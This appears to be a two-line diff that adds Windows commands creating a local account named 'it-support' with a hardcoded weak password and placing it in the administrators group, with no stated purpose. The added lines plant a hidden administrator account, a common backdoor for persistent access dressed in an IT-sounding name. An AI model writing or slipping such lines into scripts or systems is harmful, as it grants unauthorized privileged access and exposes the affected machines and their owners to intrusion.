@@ -1,0 +1,2 @@
+net user it-support P@$$w0rd /add
+net localgroup administrators it-support /add
